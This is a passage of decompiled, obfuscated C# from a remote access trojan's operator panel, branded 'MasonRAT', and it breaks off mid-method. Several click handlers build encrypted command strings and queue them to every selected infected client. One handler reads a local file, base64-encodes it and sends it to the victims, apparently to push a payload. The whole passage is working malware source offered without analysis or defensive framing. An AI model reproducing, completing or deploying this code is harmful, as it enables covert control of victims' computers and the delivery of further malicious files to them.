    strArray[(-1940966167 - (870766674 >> 527361783) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ ~((1917356796 << 252265315) - 512986209 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1645);
    strArray[((792999235 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - ((792999247 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[((-2107783768 ^ 21) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - -((-275538708 ^ ~1842239828) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1646);
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cڙ\u0608ء\u0020ــ\u060C\u0608دبحح\u060Aټڙڙ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string[] strArray = new string[(330326062 - 1370061866 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ -((1386640386 ^ (1715539293 | 723413996)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)];
    strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1647);
    strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[(-1340468663 ^ (1494292630 | 643186595)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + ((817025536 ^ 4) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1648);
    strArray[((150617702 << 1180327170) - 602470798 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - (1177933762 + 715346154 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 >> ((268274370 | 627713169) - 273060919 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[(789441283 + ~1205161853 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + ((1583550231 ^ 22) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) % (581052704 + 1603995825 % 1601133712 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1649);
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Eڝـْۙٸڣڕڠ\u0608ــۡــﻻ\u060E(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1650) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1651));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C̍\u060Aـٽ̨ـ\u060Aط\u060Dۭ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1652) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1653));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cڟـּ̨\u060E\u0609\u0608ﮪڙـ\u0020ڦ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string[] strArray = new string[(1826960940 + 223469968 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - ((2050430909 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1)];
    strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1654);
    strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[(~887500804 - 1722657016 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 > (1603885693 > 364147719 ? 2116322861 : -1473203482) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ? (435509937 > 1649152940 ? 2 : 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 : -832978942 - (168194766 << 1011562957) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1655);
    strArray[((-172512259 ^ -172512279) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ (21 ^ 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[1025807283 - 256965434 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 - ((1019759034 | 1439907528) - 1342695301 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1656);
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Fٺـؤڙ\u060Bـ\u0609\u060D\u060Dۭ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string[] strArray = new string[((1831080744 - 1113808823 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) > -1326035073 - (1924219213 | 254871746) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ? (265750680 ^ 265750686 % 1533809377) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 : 1659793705 - 1659793700 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0];
    strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1657);
    strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[(-2069555306 - 1702326052 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - (-1867423563 - 1904457797 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1658);
    strArray[1877135495 + (1895438922 >> 50039577) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + -((1737522105 ^ 141732613 % 186649805) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[(-506369054 - (1438884426 << 313090983) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ (-602834170 ^ -10346795) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 >> 1656713038 - 1320702143 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1659);
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608ۛﻼ\u0608ۭٺڠژڜگـطۙـــۡ\u0608ڣد(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1660) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1661))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u060D\u060Fٺٽم̨ٽڙۧء\u060Bاڙڜـ\u060A(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
